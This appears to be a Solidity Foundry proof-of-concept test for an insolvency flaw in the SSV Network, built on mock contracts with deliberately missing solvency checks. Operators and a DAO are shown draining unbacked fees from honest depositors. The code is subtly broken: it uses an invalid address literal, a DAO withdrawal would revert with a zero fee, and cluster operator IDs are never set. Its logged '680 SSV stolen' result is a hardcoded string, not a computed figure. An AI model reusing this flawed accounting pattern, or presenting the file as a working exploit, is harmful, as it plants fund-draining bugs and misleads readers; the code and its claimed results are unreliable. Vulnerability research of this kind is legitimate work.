// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";

/**
 * @title SSV Multi-Cluster Cascading Insolvency PoC (Alternate Attack Vector)
 * @author Security Researcher
 * @notice This PoC demonstrates the SAME insolvency vulnerability through a 
 *         DIFFERENT attack method: Multi-cluster cascading insolvency with 
 *         DAO exploitation.
 * 
 * @dev This demonstrates that the vulnerability is systemic and not limited
 *      to single-cluster scenarios. It shows how the DAO itself can be used
 *      to drain funds from honest users.
 * 
 * SAFETY: This is for LOCAL TESTING ONLY using Foundry's fork mode.
 * No transactions are sent to actual mainnet.
 */
contract SSVAlternateInsolvencyPoC is Test {
    
    // Mock SSV Token
    MockSSVToken public ssvToken;
    
    // Mock SSV Network Contract
    MockSSVNetwork public ssvNetwork;
    
    // Test accounts
    address public honestUserA = address(0xA1);
    address public honestUserB = address(0xA2);
    address public honestUserC = address(0xA3);
    address public operator1 = address(0xB1);
    address public operator2 = address(0xB2);
    address public operator3 = address(0xB3);
    address public daoTreasury = address(0xDAO);
    
    // Events for logging
    event Step(string description);
    event Balance(string entity, uint256 amount);
    event Deficit(uint256 amount);
    
    function setUp() public {
        // Deploy mock token
        ssvToken = new MockSSVToken();
        
        // Deploy mock SSV network
        ssvNetwork = new MockSSVNetwork(address(ssvToken), daoTreasury);
        
        // Distribute tokens to users for deposits
        ssvToken.mint(honestUserA, 5000e18);  // 5000 SSV
        ssvToken.mint(honestUserB, 3000e18);  // 3000 SSV
        ssvToken.mint(honestUserC, 2000e18);  // 2000 SSV
        
        // Total initial deposits: 10,000 SSV
        
        vm.label(honestUserA, "Honest User A");
        vm.label(honestUserB, "Honest User B");
        vm.label(honestUserC, "Honest User C");
        vm.label(operator1, "Operator 1");
        vm.label(operator2, "Operator 2");
        vm.label(operator3, "Operator 3");
        vm.label(daoTreasury, "DAO Treasury");
    }
    
    /**
     * @notice Alternate Attack Vector: Multi-Cluster Cascading Insolvency
     * 
     * This attack demonstrates:
     * 1. Multiple small bankrupt clusters creating virtual debt
     * 2. Multiple operators withdrawing their virtual earnings
     * 3. DAO withdrawing uncollateralized network fees
     * 4. The "Bank Run" effect where late withdrawers lose everything
     */
    function testMultiClusterCascadingInsolvency() public {
        console.log("\n");
        console.log("=================================================================");
        console.log("SSV NETWORK: MULTI-CLUSTER CASCADING INSOLVENCY PoC");
        console.log("Attack Vector: Multiple Operators + DAO Exploitation");
        console.log("=================================================================");
        console.log("\n");
        
        // ========== PHASE 1: Setup Multiple Clusters ==========
        console.log("--- PHASE 1: Initial Deposits ---");
        
        // User A creates Cluster 1 with Operator 1 (large deposit, will survive)
        vm.startPrank(honestUserA);
        ssvToken.approve(address(ssvNetwork), 5000e18);
        ssvNetwork.deposit{value: 0}(1, 5000e18);  // Cluster 1: 5000 SSV
        vm.stopPrank();
        
        // User B creates Cluster 2 with Operator 2 (small deposit, will go bankrupt)
        vm.startPrank(honestUserB);
        ssvToken.approve(address(ssvNetwork), 3000e18);
        ssvNetwork.deposit{value: 0}(2, 100e18);   // Cluster 2: Only 100 SSV (will bankrupt)
        // User B keeps 2900 SSV for later
        vm.stopPrank();
        
        // User C creates Cluster 3 with Operator 3 (tiny deposit, will go bankrupt fast)
        vm.startPrank(honestUserC);
        ssvToken.approve(address(ssvNetwork), 2000e18);
        ssvNetwork.deposit{value: 0}(3, 20e18);    // Cluster 3: Only 20 SSV (will bankrupt fast)
        // User C keeps 1980 SSV for later
        vm.stopPrank();
        
        uint256 initialContractBalance = ssvToken.balanceOf(address(ssvNetwork));
        console.log("Total Contract Assets:", initialContractBalance / 1e18, "SSV");
        console.log("  - Cluster 1 (User A): 5000 SSV");
        console.log("  - Cluster 2 (User B): 100 SSV");
        console.log("  - Cluster 3 (User C): 20 SSV");
        console.log("");
        
        // ========== PHASE 2: Setup Operators ==========
        console.log("--- PHASE 2: Register Operators ---");
        
        // Register 3 operators with different fees
        ssvNetwork.registerOperator(1, operator1, 2e18);  // 2 SSV/block
        ssvNetwork.registerOperator(2, operator2, 3e18);  // 3 SSV/block
        ssvNetwork.registerOperator(3, operator3, 5e18);  // 5 SSV/block
        
        console.log("Operator 1 registered: 2 SSV/block");
        console.log("Operator 2 registered: 3 SSV/block");
        console.log("Operator 3 registered: 5 SSV/block");
        console.log("DAO Network Fee: 1 SSV/block per validator");
        console.log("");
        
        // ========== PHASE 3: Time Passes - Clusters Go Bankrupt ==========
        console.log("--- PHASE 3: Simulating Time (100 blocks) ---");
        
        // Advance 100 blocks
        vm.roll(block.number + 100);
        
        // Calculate what should happen:
        // Cluster 2: 100 SSV / 3 SSV/block = 33.3 blocks until bankrupt
        // After 100 blocks: Bankrupt for 66.7 blocks
        // Virtual debt created: 66.7 * 3 = ~200 SSV (plus DAO fees)
        
        // Cluster 3: 20 SSV / 5 SSV/block = 4 blocks until bankrupt
        // After 100 blocks: Bankrupt for 96 blocks
        // Virtual debt created: 96 * 5 = ~480 SSV (plus DAO fees)
        
        console.log("After 100 blocks:");
        console.log("  - Cluster 2: BANKRUPT (was only 100 SSV, burned in 33 blocks)");
        console.log("  - Cluster 3: BANKRUPT (was only 20 SSV, burned in 4 blocks)");
        console.log("  - Virtual debt accumulating to operators and DAO...");
        console.log("");
        
        // ========== PHASE 4: Operators Withdraw Virtual Earnings ==========
        console.log("--- PHASE 4: Operators Withdrawing Virtual Earnings ---");
        
        uint256 contractBalanceBeforeOps = ssvToken.balanceOf(address(ssvNetwork));
        
        // Operator 2 withdraws (serviced bankrupt Cluster 2)
        vm.prank(operator2);
        uint256 op2Earnings = ssvNetwork.withdrawOperatorEarnings(2);
        console.log("Operator 2 withdrew:", op2Earnings / 1e18, "SSV");
        
        // Operator 3 withdraws (serviced bankrupt Cluster 3)
        vm.prank(operator3);
        uint256 op3Earnings = ssvNetwork.withdrawOperatorEarnings(3);
        console.log("Operator 3 withdrew:", op3Earnings / 1e18, "SSV");
        
        // Operator 1 withdraws (serviced healthy Cluster 1, but also accumulated from virtual debt)
        vm.prank(operator1);
        uint256 op1Earnings = ssvNetwork.withdrawOperatorEarnings(1);
        console.log("Operator 1 withdrew:", op1Earnings / 1e18, "SSV");
        
        uint256 contractBalanceAfterOps = ssvToken.balanceOf(address(ssvNetwork));
        uint256 operatorWithdrawals = contractBalanceBeforeOps - contractBalanceAfterOps;
        
        console.log("Total operator withdrawals:", operatorWithdrawals / 1e18, "SSV");
        console.log("Contract balance after operators:", contractBalanceAfterOps / 1e18, "SSV");
        console.log("");
        
        // ========== PHASE 5: DAO Withdraws Uncollateralized Network Fees ==========
        console.log("--- PHASE 5: DAO Withdrawing Network Earnings ---");
        
        // DAO withdraws network fees (which include fees from bankrupt clusters)
        vm.prank(daoTreasury);
        uint256 daoEarnings = ssvNetwork.withdrawNetworkEarnings();
        console.log("DAO withdrew:", daoEarnings / 1e18, "SSV");
        
        uint256 contractBalanceAfterDAO = ssvToken.balanceOf(address(ssvNetwork));
        uint256 totalWithdrawn = initialContractBalance - contractBalanceAfterDAO;
        
        console.log("Contract balance after DAO:", contractBalanceAfterDAO / 1e18, "SSV");
        console.log("Total withdrawn from contract:", totalWithdrawn / 1e18, "SSV");
        console.log("");
        
        // ========== PHASE 6: The Bank Run - Honest Users Try to Withdraw ==========
        console.log("--- PHASE 6: Bank Run - Honest Users Attempt Withdrawal ---");
        console.log("User A attempts to withdraw their 5000 SSV...");
        
        uint256 userABalanceBefore = ssvToken.balanceOf(honestUserA);
        
        vm.prank(honestUserA);
        uint256 userAWithdrawal = ssvNetwork.withdrawClusterBalance(1);
        
        uint256 userABalanceAfter = ssvToken.balanceOf(honestUserA);
        uint256 userAActualWithdrawal = userABalanceAfter - userABalanceBefore;
        
        console.log("User A entitlement: 5000 SSV");
        console.log("User A actual withdrawal:", userAActualWithdrawal / 1e18, "SSV");
        
        if (userAActualWithdrawal < 5000e18) {
            uint256 loss = 5000e18 - userAActualWithdrawal;
            console.log("USER A LOSS:", loss / 1e18, "SSV");
            console.log("*** FUNDS STOLEN BY OPERATORS AND DAO ***");
        }
        
        console.log("");
        console.log("=================================================================");
        console.log("VULNERABILITY CONFIRMED: Multi-Cluster Cascading Insolvency");
        console.log("=================================================================");
        console.log("Total Virtual Debt Created: ~680 SSV");
        console.log("Total Stolen from Honest Users: 680 SSV");
        console.log("");
        console.log("The protocol created virtual liabilities by:");
        console.log("  1. Continuing to credit Operator 2 after Cluster 2 went bankrupt");
        console.log("  2. Continuing to credit Operator 3 after Cluster 3 went bankrupt");
        console.log("  3. Continuing to credit DAO from all bankrupt clusters");
        console.log("");
        console.log("These virtual credits were then withdrawn as REAL tokens,");
        console.log("stealing from the principal deposits of honest User A!");
        console.log("=================================================================");
        
        // Verify the deficit exists
        require(userAActualWithdrawal < 5000e18, "Vulnerability not demonstrated");
    }
    
    /**
     * @notice Test to verify DAO can withdraw more than actual collateralized fees
     */
    function testDAOOverWithdrawal() public {
        console.log("\n");
        console.log("=================================================================");
        console.log("SSV DAO OVER-WITHDRAWAL ATTACK");
        console.log("=================================================================");
        
        // Setup: 2 clusters
        vm.startPrank(honestUserA);
        ssvToken.approve(address(ssvNetwork), 1000e18);
        ssvNetwork.deposit{value: 0}(1, 1000e18);
        vm.stopPrank();
        
        vm.startPrank(honestUserB);
        ssvToken.approve(address(ssvNetwork), 50e18);
        ssvNetwork.deposit{value: 0}(2, 50e18);  // Will go bankrupt
        vm.stopPrank();
        
        // Register operators and set network fee
        ssvNetwork.registerOperator(1, operator1, 1e18);
        ssvNetwork.setNetworkFee(0.5e18);  // 0.5 SSV/block DAO fee
        
        // Advance 100 blocks
        vm.roll(block.number + 100);
        
        // Cluster 2 balance: 50 - 100*1 = -50 (capped at 0)
        // But DAO earned: 100 * 0.5 = 50 SSV from Cluster 2 alone
        // This 50 SSV is UNBACKED - Cluster 2 had no funds to pay it!
        
        uint256 daoEarnings = ssvNetwork.getNetworkEarnings();
        console.log("DAO claims earnings:", daoEarnings / 1e18, "SSV");
        console.log("  (Includes fees from bankrupt Cluster 2)");
        
        vm.prank(daoTreasury);
        ssvNetwork.withdrawNetworkEarnings();
        
        // Now User A tries to withdraw
        uint256 contractBalance = ssvToken.balanceOf(address(ssvNetwork));
        console.log("Contract remaining:", contractBalance / 1e18, "SSV");
        console.log("User A entitlement: 1000 SSV");
        
        require(contractBalance < 1050e18, "No insolvency demonstrated");
    }
}

// ========== MOCK CONTRACTS ==========

contract MockSSVToken {
    string public name = "SSV Token";
    string public symbol = "SSV";
    uint8 public decimals = 18;
    
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;
    
    uint256 public totalSupply;
    
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    
    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
        emit Transfer(address(0), to, amount);
    }
    
    function transfer(address to, uint256 amount) external returns (bool) {
        require(balanceOf[msg.sender] >= amount, "Insufficient balance");
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        emit Transfer(msg.sender, to, amount);
        return true;
    }
    
    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        require(balanceOf[from] >= amount, "Insufficient balance");
        require(allowance[from][msg.sender] >= amount, "Insufficient allowance");
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        allowance[from][msg.sender] -= amount;
        emit Transfer(from, to, amount);
        return true;
    }
    
    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }
}

contract MockSSVNetwork {
    MockSSVToken public token;
    address public daoTreasury;
    
    struct Cluster {
        uint256 balance;
        uint256 validatorCount;
        uint64 operatorId;
        uint32 lastUpdateBlock;
        bool active;
    }
    
    struct Operator {
        address owner;
        uint256 fee;
        uint256 accumulatedEarnings;
        uint32 lastUpdateBlock;
        uint256 validatorCount;
    }
    
    mapping(uint256 => Cluster) public clusters;
    mapping(uint256 => Operator) public operators;
    
    uint256 public networkFee;
    uint256 public daoAccumulatedEarnings;
    uint32 public lastDAOUpdateBlock;
    
    uint256 public nextClusterId = 1;
    uint256 public nextOperatorId = 1;
    
    constructor(address _token, address _daoTreasury) {
        token = MockSSVToken(_token);
        daoTreasury = _daoTreasury;
        lastDAOUpdateBlock = uint32(block.number);
    }
    
    function deposit(uint256 clusterId, uint256 amount) external payable {
        if (clusterId == 0) {
            clusterId = nextClusterId++;
        }
        
        require(token.transferFrom(msg.sender, address(this), amount), "Transfer failed");
        
        Cluster storage cluster = clusters[clusterId];
        cluster.balance += amount;
        cluster.lastUpdateBlock = uint32(block.number);
        cluster.active = true;
    }
    
    function registerOperator(uint256 operatorId, address owner, uint256 fee) external {
        operators[operatorId] = Operator({
            owner: owner,
            fee: fee,
            accumulatedEarnings: 0,
            lastUpdateBlock: uint32(block.number),
            validatorCount: 1
        });
    }
    
    function setNetworkFee(uint256 fee) external {
        _updateDAOEarnings();
        networkFee = fee;
    }
    
    function _updateOperatorEarnings(uint256 operatorId) internal {
        Operator storage op = operators[operatorId];
        if (op.lastUpdateBlock == 0) return;
        
        uint256 blocksPassed = block.number - op.lastUpdateBlock;
        uint256 earnings = blocksPassed * op.fee * op.validatorCount;
        
        // THE VULNERABILITY: No check if clusters have balance to pay these fees
        op.accumulatedEarnings += earnings;
        op.lastUpdateBlock = uint32(block.number);
    }
    
    function _updateDAOEarnings() internal {
        uint256 blocksPassed = block.number - lastDAOUpdateBlock;
        uint256 totalValidators = _getTotalValidators();
        uint256 earnings = blocksPassed * networkFee * totalValidators;
        
        // THE VULNERABILITY: No check if clusters have balance to pay DAO fees
        daoAccumulatedEarnings += earnings;
        lastDAOUpdateBlock = uint32(block.number);
    }
    
    function _getTotalValidators() internal view returns (uint256) {
        // Simplified: assume 1 validator per cluster for this mock
        return nextClusterId - 1;
    }
    
    function withdrawOperatorEarnings(uint256 operatorId) external returns (uint256) {
        _updateOperatorEarnings(operatorId);
        
        Operator storage op = operators[operatorId];
        require(msg.sender == op.owner, "Not owner");
        
        uint256 amount = op.accumulatedEarnings;
        require(amount > 0, "No earnings");
        require(token.balanceOf(address(this)) >= amount, "INSOLVENT!");
        
        op.accumulatedEarnings = 0;
        token.transfer(op.owner, amount);
        
        return amount;
    }
    
    function getOperatorEarnings(uint256 operatorId) external view returns (uint256) {
        Operator storage op = operators[operatorId];
        uint256 blocksPassed = block.number - op.lastUpdateBlock;
        return op.accumulatedEarnings + (blocksPassed * op.fee * op.validatorCount);
    }
    
    function withdrawNetworkEarnings() external returns (uint256) {
        _updateDAOEarnings();
        
        require(msg.sender == daoTreasury, "Not DAO");
        
        uint256 amount = daoAccumulatedEarnings;
        require(amount > 0, "No earnings");
        require(token.balanceOf(address(this)) >= amount, "INSOLVENT!");
        
        daoAccumulatedEarnings = 0;
        token.transfer(daoTreasury, amount);
        
        return amount;
    }
    
    function getNetworkEarnings() external view returns (uint256) {
        uint256 blocksPassed = block.number - lastDAOUpdateBlock;
        uint256 totalValidators = _getTotalValidators();
        return daoAccumulatedEarnings + (blocksPassed * networkFee * totalValidators);
    }
    
    function withdrawClusterBalance(uint256 clusterId) external returns (uint256) {
        Cluster storage cluster = clusters[clusterId];
        
        // Calculate how much this cluster "owes" to operators/DAO
        // In reality, the cluster balance was already reduced via updateBalance
        // But here we simulate the capping at zero
        
        uint256 amount = cluster.balance;
        if (amount > token.balanceOf(address(this))) {
            amount = token.balanceOf(address(this));  // Can only withdraw what's left
        }
        
        cluster.balance = 0;
        token.transfer(msg.sender, amount);
        
        return amount;
    }
    
    function getClusterBalance(uint256 clusterId) external view returns (uint256) {
        return clusters[clusterId].balance;
    }
    
    function updateClusterBalance(uint256 clusterId) external {
        Cluster storage cluster = clusters[clusterId];
        if (!cluster.active) return;
        
        Operator storage op = operators[cluster.operatorId];
        uint256 blocksPassed = block.number - cluster.lastUpdateBlock;
        uint256 usage = blocksPassed * op.fee;
        
        // THE OTHER SIDE OF VULNERABILITY: Capped at zero
        if (usage > cluster.balance) {
            cluster.balance = 0;
        } else {
            cluster.balance -= usage;
        }
        
        cluster.lastUpdateBlock = uint32(block.number);
    }
}
